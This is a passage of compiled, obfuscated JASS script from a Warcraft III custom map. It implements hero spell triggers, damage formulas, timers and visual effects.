if GetUnitTypeId(Pq)==$48303738 then
set M6="war3mapImported\\Conflagrate.mdx"
else
set M6="war3mapImported\\AZ_Abaddon01_D.mdx"
endif
endif
call DestroyEffect(AddSpecialEffectTarget(M6,Hu,"origin"))
if GetUnitAbilityLevel(Pq,$41313436)>=1 then
call IssueTargetOrder(Hu,"attack",Pq)
set Mc=GetUnitLoc(Hu)
set No=CreateUnitAtLoc(Player(0),$68303739,Mc,0)
call nD(No,1)
call UnitAddAbility(No,$41305530)
if GetUnitAbilityLevel(Pq,$41313159)>=1 then
call SetUnitAbilityLevel(No,$41305530,3)
else
call SetUnitAbilityLevel(No,$41305530,2)
endif
call IssueTargetOrder(No,"innerfire",Hu)
call RemoveLocation(Mc)
set Mc=null
set No=null
else
call UnitAddAbility(Hu,$41304453)
if GetUnitAbilityLevel(Pq,$41313159)>=1 then
call SetUnitAbilityLevel(Hu,$41304453,11)
else
call SetUnitAbilityLevel(Hu,$41304453,GetUnitAbilityLevel(Pq,$41313147))
endif
set Np=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Np),0,Hu)
call TimerStart(Np,5,false,function qP)
set Np=null
endif
set Hu=null
endfunction
function qR takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local location Ht=GetUnitLoc(Hu)
local group V9
local boolexpr Nb
local real NS
if GetUnitTypeId(Hu)==$48303738 then
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Soul Discharge Red.mdx",Ht))
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Conflagrate.mdx",Ht))
else
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\AZ_Abaddon01_T2.mdx",Ht))
endif
set V9=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(V9,GetLocationX(Ht),GetLocationY(Ht),500,Nb)
call DestroyBoolExpr(Nb)
set Pq=Hu
if GetUnitAbilityLevel(Hu,$41313159)>=1 then
set NS=I2R(4000+GetHeroStr(Hu,true)*13)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
else
set NS=I2R(GetUnitAbilityLevel(Hu,$41313147)*200+GetHeroStr(Hu,true)*8)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
endif
set Nu=R2I(NS)
call ForGroup(V9,function qQ)
call DestroyGroup(V9)
set Nb=null
set V9=null
call RemoveLocation(Ht)
set Ht=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set Hu=null
endfunction
function qS takes nothing returns nothing
local unit PK=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local integer Mg=LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call SetHeroStr(PK,GetHeroStr(PK,false)-Mg,false)
call SetPlayerAbilityAvailable(GetOwningPlayer(PK),$41313758,false)
set PK=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function qT takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local location Ht
local location Nk
local integer L9
local timer Hc
local group V9
local boolexpr Nb
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local real NS
local unit Mc
local string No
if GetSpellAbilityId()==$4131314B then
call GroupRemoveUnit(To,Hu)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$4131314B,false)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$4131314A,true)
if GetUnitAbilityLevel(Hu,$4131314A)==0 then
call UnitAddAbility(Hu,$4131314A)
endif
call UnitRemoveAbility(Hu,$41313436)
call SetUnitAbilityLevel(Hu,$4131314A,GetUnitAbilityLevel(Hu,$4131314B))
call DestroyEffect(WM[Ma])
set WM[Ma]=AddSpecialEffectTarget("war3mapImported\\Sweep_Blood_Large.mdx",Hu,"weapon")
elseif GetSpellAbilityId()==$4131314A then
if IsUnitInGroup(Hu,To)==false then
call GroupAddUnit(To,Hu)
endif
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$4131314A,false)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$4131314B,true)
if GetUnitAbilityLevel(Hu,$4131314B)==0 then
call UnitAddAbility(Hu,$4131314B)
endif
call UnitAddAbility(Hu,$41313436)
call SetUnitAbilityLevel(Hu,$4131314B,GetUnitAbilityLevel(Hu,$4131314A))
call DestroyEffect(WM[Ma])
set WM[Ma]=AddSpecialEffectTarget("war3mapImported\\Sweep_Astral_Large.mdx",Hu,"weapon")
elseif GetSpellAbilityId()==$41313147 or GetSpellAbilityId()==$41313159 then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,2,false,function qR)
set Hc=null
elseif GetSpellAbilityId()==$41313148 or GetSpellAbilityId()==$41313157 then
call UnitAddAbility(Hu,$4130584B)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
if GetUnitTypeId(Hu)==$48303738 then
call SaveEffectHandle(Nq,GetHandleId(Hc),1,AddSpecialEffectTarget("war3mapImported\\Mana Storm.mdx",Hu,"origin"))
else
call SaveEffectHandle(Nq,GetHandleId(Hc),1,AddSpecialEffectTarget("war3mapImported\\AZ_Abaddon01_T1.mdx",Hu,"origin"))
endif
call TimerStart(Hc,6.5+I2R(GetUnitAbilityLevel(Hu,$41313148))/2+I2R(GetUnitAbilityLevel(Hu,$41313157))*5,false,function qP)
set Hc=null
elseif GetSpellAbilityId()==$41304539 or GetSpellAbilityId()==$4130454B then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,GetSpellTargetUnit())
call SaveInteger(Nq,GetHandleId(Hc),2,5)
call TimerStart(Hc,.5,true,function qO)
set Hc=null
elseif GetSpellAbilityId()==$41314251 then
set Ht=GetUnitLoc(Hu)
set V9=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(V9,GetLocationX(Ht),GetLocationY(Ht),500,Nb)
call DestroyBoolExpr(Nb)
set Pq=Hu
set NS=I2R(GetHeroStr(Hu,true)*8)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
if GetUnitAbilityLevel(Hu,$4130584B)>=1 then
set Nu=R2I(NS+NS/5)
else
set Nu=R2I(NS)
endif
call ForGroup(V9,function m9)
call nd(V9,$4131324E,2,"creepthunderbolt")
call DestroyGroup(V9)
set Nb=null
set V9=null
call RemoveLocation(Ht)
set Ht=null
endif
if GetSpellAbilityId()==$41314152 or GetSpellAbilityId()==$41314251 or GetSpellAbilityId()==$41313147 or GetSpellAbilityId()==$41313159 or GetSpellAbilityId()==$41313148 or GetSpellAbilityId()==$41313157 or GetSpellAbilityId()==$41304539 or GetSpellAbilityId()==$4130454B then
if GetUnitAbilityLevel(Hu,$41313155)>=1 then
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41313758,true)
call UnitRemoveAbility(Hu,$41313758)
call UnitAddAbility(Hu,$41313758)
set L9=GetHeroStr(Hu,true)/20
call SetHeroStr(Hu,GetHeroStr(Hu,false)+L9,false)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,L9)
call TimerStart(Hc,5,false,function qS)
set Hc=null
set Ht=GetUnitLoc(Hu)
set Nk=nU(Ht,200,GetRandomReal(0,360))
set Mc=CreateUnitAtLoc(Player(Ma),$68303739,Nk,0)
if GetUnitAbilityLevel(Hu,$41313436)>=1 then
set No=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
if GetUnitTypeId(Hu)==$48303738 then
set No="war3mapImported\\Ember Purple.mdx"
else
set No="war3mapImported\\Haunt_v2.mdx"
endif
endif
call AddSpecialEffectTarget(No,Mc,"overhead")
call UnitAddAbility(Mc,$41313436)
else
set No=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
if GetUnitTypeId(Hu)==$48303738 then
set No="war3mapImported\\Ember Red.mdx"
else
set No="war3mapImported\\Haunt_v22.mdx"
endif
endif
call AddSpecialEffectTarget(No,Mc,"overhead")
endif
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Mc)
call SaveInteger(Nq,GetHandleId(Hc),2,101)
call TimerStart(Hc,.1,true,function qN)
set Hc=null
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
set Mc=null
endif
endif
set Hu=null
endfunction
function qU takes nothing returns nothing
set WL=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(WL,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(WL,function qT)
endfunction
function qV takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(WO[TT]))==true
endfunction
function qW takes nothing returns nothing
call UnitDamageTargetBJ(WO[TT],GetEnumUnit(),I2R(GetHeroAgi(WO[TT],true)/7+50)*I2R(GetUnitAbilityLevel(WO[TT],$4130595A))*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[TT]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call UnitDamageTargetBJ(WO[TT],GetEnumUnit(),I2R(GetHeroAgi(WO[TT],true)*2+500)*I2R(GetUnitAbilityLevel(WO[TT],$41305941))*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[TT]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qX takes nothing returns boolean
if not (UnitHasBuffBJ(WO[TT+10],$42303648)==true) then
return false
endif
return true
endfunction
function qY takes nothing returns nothing
set TT=1
loop
exitwhen TT>8
if qX() then
set WP[TT]=GetUnitLoc(WO[TT+10])
set TU[TT]=GetUnitsInRangeOfLocMatching(520.,WP[TT],Condition(function qV))
call ForGroupBJ(TU[TT],function qW)
call RemoveLocation(WP[TT])
call DestroyGroup(TU[TT])
else
endif
set TT=TT+1
endloop
endfunction
function qZ takes nothing returns nothing
set WN=CreateTrigger()
call DisableTrigger(WN)
call TriggerRegisterTimerEventPeriodic(WN,1.)
call TriggerAddAction(WN,function qY)
endfunction
function qa takes nothing returns boolean
if GetSpellAbilityId()==$41305941 then
return true
endif
if GetSpellAbilityId()==$4130595A then
return true
endif
return false
endfunction
function qb takes nothing returns boolean
if not qa() then
return false
endif
return true
endfunction
function qc takes nothing returns boolean
if GetSpellAbilityId()==$41305946 then
return true
endif
if GetSpellAbilityId()==$41305957 then
return true
endif
return false
endfunction
function qd takes nothing returns boolean
if not qc() then
return false
endif
return true
endfunction
function qe takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function qf takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*2.*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qg takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*2.*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qh takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*2.*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qi takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*2.*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qj takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*2.*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qk takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*2.*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function ql takes nothing returns boolean
if not (GetSpellAbilityId()==$41305957) then
return false
endif
return true
endfunction
function qm takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function qn takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*(I2R(GetUnitAbilityLevel(WO[20],$41305946))*.1)*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qo takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*(I2R(GetUnitAbilityLevel(WO[20],$41305946))*.1)*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qp takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*(I2R(GetUnitAbilityLevel(WO[20],$41305946))*.1)*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qq takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*(I2R(GetUnitAbilityLevel(WO[20],$41305946))*.1)*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qr takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*(I2R(GetUnitAbilityLevel(WO[20],$41305946))*.1)*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qs takes nothing returns nothing
call UnitDamageTargetBJ(WO[20],GetEnumUnit(),I2R(GetHeroAgi(WO[20],true))*(I2R(GetUnitAbilityLevel(WO[20],$41305946))*.1)*Nd[GetConvertedPlayerId(GetOwningPlayer(WO[20]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qt takes nothing returns boolean
if not (GetSpellAbilityId()==$41305946) then
return false
endif
return true
endfunction
function qu takes nothing returns nothing
if qb() then
set WO[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetTriggerUnit()
set WO[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10]=GetSpellTargetUnit()
call EnableTrigger(WN)
else
endif
if qd() then
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=12
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
set Rt=Rt+30.
set WR[3]=GetUnitLoc(GetTriggerUnit())
set Rs[3]=GetRandomReal(Rt-2.,Rt+2.)
set Ru[3]=GetRandomReal(-5.,5.)
set Rr[3]=GetRandomReal(100.,100.)
call CreateNUnitsAtLoc(1,$68303451,GetOwningPlayer(GetTriggerUnit()),WR[3],Rs[3])
set WS[3]=GetLastCreatedUnit()
call UnitApplyTimedLifeBJ(5.,$42544C46,WS[3])
set WR[3]=PolarProjectionBJ(WR[3],Rr[3],Rs[3])
call SetUnitPositionLoc(WS[3],WR[3])
call IssuePointOrderLocBJ(WS[3],"breathoffrost",WR[3])
call RemoveLocation(WR[3])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
set Rt=0.
set Rs[3]=0.
set Ru[3]=0.
set Rr[3]=0.
set WS[3]=null
else
endif
if ql() then
set WO[20]=GetTriggerUnit()
set WP[7]=GetUnitLoc(WO[20])
set TU[7]=GetUnitsInRangeOfLocMatching(800.,WP[7],Condition(function qe))
call ForGroupBJ(TU[7],function qf)
call TriggerSleepAction(1.)
call ForGroupBJ(TU[7],function qg)
call TriggerSleepAction(1.)
call ForGroupBJ(TU[7],function qh)
call TriggerSleepAction(1.)
call ForGroupBJ(TU[7],function qi)
call TriggerSleepAction(1.)
call ForGroupBJ(TU[7],function qj)
call TriggerSleepAction(1.)
call ForGroupBJ(TU[7],function qk)
call RemoveLocation(WP[7])
call DestroyGroup(TU[7])
set WO[20]=null
else
endif
if qt() then
set WO[20]=GetTriggerUnit()
set WP[7]=GetUnitLoc(WO[20])
set TU[7]=GetUnitsInRangeOfLocMatching(800.,WP[7],Condition(function qm))
call ForGroupBJ(TU[7],function qn)
call TriggerSleepAction(1.)
call ForGroupBJ(TU[7],function qo)
call TriggerSleepAction(1.)
call ForGroupBJ(TU[7],function qp)
call TriggerSleepAction(1.)
call ForGroupBJ(TU[7],function qq)
call TriggerSleepAction(1.)
call ForGroupBJ(TU[7],function qr)
call TriggerSleepAction(1.)
call ForGroupBJ(TU[7],function qs)
call RemoveLocation(WP[7])
call DestroyGroup(TU[7])
set WO[20]=null
else
endif
endfunction
function qv takes nothing returns nothing
set WQ=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(WQ,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(WQ,function qu)
endfunction
function qw takes nothing returns boolean
if not (GetUnitAbilityLevel(GetAttacker(),$4130594E)<1) then
return false
endif
return true
endfunction
function qx takes nothing returns boolean
if not (GetUnitAbilityLevel(GetAttacker(),$4130594A)==1) then
return false
endif
if not (GetRandomInt(1,10)==1) then
return false
endif
return true
endfunction
function qy takes nothing returns boolean
if not (GetUnitAbilityLevel(GetAttacker(),$41305950)<1) then
return false
endif
return true
endfunction
function qz takes nothing returns boolean
if not (GetUnitAbilityLevel(GetAttacker(),$4130594A)==2) then
return false
endif
if not (GetRandomInt(1,10)==1) then
return false
endif
return true
endfunction
function q0 takes nothing returns boolean
if not (GetUnitAbilityLevel(GetAttacker(),$4130594F)<1) then
return false
endif
return true
endfunction
function q1 takes nothing returns boolean
if not (GetUnitAbilityLevel(GetAttacker(),$4130594A)==3) then
return false
endif
if not (GetRandomInt(1,10)==1) then
return false
endif
return true
endfunction
function q2 takes nothing returns boolean
if not (IsUnitEnemy(GetAttacker(),GetOwningPlayer(GetTriggerUnit()))==true) then
return false
endif
return true
endfunction
function q3 takes nothing returns nothing
if q2() then
if qx() then
if qw() then
call SetUnitVertexColor(GetAttacker(),20,20,20,100)
call UnitAddAbility(GetAttacker(),$4130594E)
call TriggerSleepAction(7.)
call SetUnitVertexColor(GetAttacker(),255,255,255,255)
call UnitRemoveAbility(GetAttacker(),$4130594E)
call UnitRemoveBuffBJ($4230364C,GetAttacker())
else
endif
else
endif
if qz() then
if qy() then
call SetUnitVertexColor(GetAttacker(),20,20,20,100)
call UnitAddAbility(GetAttacker(),$41305950)
call TriggerSleepAction(7.)
call SetUnitVertexColor(GetAttacker(),255,255,255,255)
call UnitRemoveAbility(GetAttacker(),$41305950)
call UnitRemoveBuffBJ($4230364C,GetAttacker())
else
endif
else
endif
if q1() then
if q0() then
call SetUnitVertexColor(GetAttacker(),20,20,20,100)
call UnitAddAbility(GetAttacker(),$4130594F)
call TriggerSleepAction(7.)
call SetUnitVertexColor(GetAttacker(),255,255,255,255)
call UnitRemoveAbility(GetAttacker(),$4130594F)
call UnitRemoveBuffBJ($4230364C,GetAttacker())
else
endif
else
endif
else
endif
endfunction
function q4 takes nothing returns nothing
set WT=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(WT,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddAction(WT,function q3)
endfunction
function q5 takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$48303353 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$48303550 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$48303730 then
return true
endif
return false
endfunction
function q6 takes nothing returns boolean
if not q5() then
return false
endif
return true
endfunction
function q7 takes nothing returns boolean
if not (GetIssuedOrderIdBJ()==String2OrderIdBJ("flamingarrows")) then
return false
endif
return true
endfunction
function q8 takes nothing returns boolean
if not (GetIssuedOrderIdBJ()==String2OrderIdBJ("unflamingarrows")) then
return false
endif
return true
endfunction
function q9 takes nothing returns nothing
if q7() then
set Ni[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=true
else
endif
if q8() then
set Ni[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
endfunction
function rB takes nothing returns nothing
set WU=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(WU,EVENT_PLAYER_UNIT_ISSUED_ORDER)
call TriggerAddCondition(WU,Condition(function q6))
call TriggerAddAction(WU,function q9)
endfunction
function rC takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local group Mc
local real No
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),3,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)>=1 then
set Mc=LoadGroupHandle(Nq,GetHandleId(GetExpiredTimer()),1)
set Pq=Hu
set No=I2R(GetUnitAbilityLevel(Hu,$41313955)*150+GetHeroStr(Hu,true)*3)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(No)
call ForGroup(Mc,function m8)
set Mc=null
else
call DestroyGroup(LoadGroupHandle(Nq,GetHandleId(GetExpiredTimer()),1))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedReal(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function rD takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call UnitRemoveAbility(Hu,$41313537)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set Hu=null
endfunction
function rE takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local group Mc
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),3,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),3)>=1 then
set Mc=LoadGroupHandle(Nq,GetHandleId(GetExpiredTimer()),1)
set Nu=R2I(LoadReal(Nq,GetHandleId(GetExpiredTimer()),2))
call ForGroup(Mc,function m4)
set Mc=null
else
call DestroyGroup(LoadGroupHandle(Nq,GetHandleId(GetExpiredTimer()),1))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedReal(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function rF takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit Nv=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))+1
local real L9
if IsUnitAlly(Nv,GetOwningPlayer(Hu))==true then
if GetUnitAbilityLevel(Hu,$4130554F)>=1 then
set L9=I2R(GetUnitAbilityLevel(Hu,$4130554F)*300+GetHeroInt(Hu,true)*3)*Nf[Ma]
elseif GetUnitAbilityLevel(Hu,$41305634)>=1 then
set L9=I2R(2000+GetHeroInt(Hu,true)*5)*Nf[Ma]
endif
if GetUnitAbilityLevel(Nv,$42303042)<=0 then
call SetUnitState(Nv,UNIT_STATE_LIFE,GetUnitState(Nv,UNIT_STATE_LIFE)+L9)
call nf(Nv,Hu,I2S(R2I(L9)))
endif
else
if GetUnitAbilityLevel(Hu,$4130554F)>=1 then
set L9=I2R(GetUnitAbilityLevel(Hu,$4130554F)*300+GetHeroStr(Hu,true)*5)*Ng[Ma]
elseif GetUnitAbilityLevel(Hu,$41305634)>=1 then
set L9=I2R(3000+GetHeroStr(Hu,true)*9)*Ng[Ma]
endif
call UnitDamageTarget(Hu,Nv,L9,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
endif
set Hu=null
set Nv=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function rG takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv=GetSpellTargetUnit()
local timer Hc
local real L9
local group Mc
local location No
local boolexpr Np
if GetSpellAbilityId()==$41313955 then
set Mc=CreateGroup()
set No=GetUnitLoc(Hu)
set Np=Condition(function mx)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),600,Np)
if GetHeroStr(Hu,false)<GetHeroInt(Hu,false) then
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Conflagrate Blue.mdl",No))
set Pq=Hu
set L9=I2R(GetUnitAbilityLevel(Hu,$41313955)*150+GetHeroInt(Hu,true)*14)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(L9)
call ForGroup(Mc,function m8)
call nd(Mc,$4131324E,1,"creepthunderbolt")
call DestroyGroup(Mc)
else
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Conflagrate.mdl",No))
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveGroupHandle(Nq,GetHandleId(Hc),1,Mc)
call SaveInteger(Nq,GetHandleId(Hc),3,6)
call TimerStart(Hc,1,true,function rC)
set Hc=null
endif
call DestroyBoolExpr(Np)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
elseif GetSpellAbilityId()==$4130554F then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Nv)
call TimerStart(Hc,.8,false,function rF)
set Hc=null
elseif GetSpellAbilityId()==$41305634 then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Nv)
call TimerStart(Hc,.8,false,function rF)
set Hc=null
elseif GetSpellAbilityId()==$4130554B then
if GetHeroStr(Hu,false)<GetHeroInt(Hu,false) then
call SetHeroStr(Hu,GetHeroStr(Hu,false)+GetHeroInt(Hu,false),false)
call SetHeroInt(Hu,0,true)
call ne(Hu,"Strength!",.023,255,0,100)
else
call SetHeroInt(Hu,GetHeroStr(Hu,false)+GetHeroInt(Hu,false),false)
call SetHeroStr(Hu,0,true)
call ne(Hu,"Intelligence!",.023,0,100,255)
endif
set L9=I2R(125*GetUnitAbilityLevel(Hu,$4130554B)+GetHeroStr(Hu,true)+GetHeroInt(Hu,true))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]/5
set Mc=CreateGroup()
set No=GetUnitLoc(Hu)
set Np=Condition(function mw)
call GroupEnumUnitsInRange(Mc,GetLocationX(No),GetLocationY(No),600,Np)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveGroupHandle(Nq,GetHandleId(Hc),1,Mc)
call SaveReal(Nq,GetHandleId(Hc),2,L9)
call SaveInteger(Nq,GetHandleId(Hc),3,8)
call TimerStart(Hc,1,true,function rE)
set Hc=null
call DestroyBoolExpr(Np)
call RemoveLocation(No)
set No=null
set Np=null
set Mc=null
elseif GetSpellAbilityId()==$41304C48 then
call SetUnitState(Hu,UNIT_STATE_MANA,GetUnitState(Hu,UNIT_STATE_MANA)-GetUnitState(Hu,UNIT_STATE_MANA)/5)
call nj(Nv,GetHeroStr(Hu,true)+150)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Nv)
call SaveInteger(PP,GetHandleId(Hc),2,GetHeroStr(Hu,true)+150)
call TimerStart(Hc,10,true,function nE)
set Hc=null
elseif GetSpellAbilityId()==$41305551 then
if GetHeroStr(Hu,false)>GetHeroInt(Hu,false) then
set L9=I2R(GetHeroStr(Hu,true)*2*GetUnitAbilityLevel(Hu,$41305551))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
call UnitAddAbility(Hu,$41313537)
if GetUnitStatePercent(Nv,UNIT_STATE_LIFE,UNIT_STATE_MAX_LIFE)<20 then
set L9=L9*3
endif
else
set L9=I2R(GetHeroInt(Hu,true)*4*GetUnitAbilityLevel(Hu,$41305551))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
call UnitAddAbility(Hu,$41313537)
if GetUnitStatePercent(Nv,UNIT_STATE_LIFE,UNIT_STATE_MAX_LIFE)<20 then
set L9=L9*3
endif
endif
call UnitDamageTarget(Hu,Nv,L9,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
call TriggerSleepAction(7)
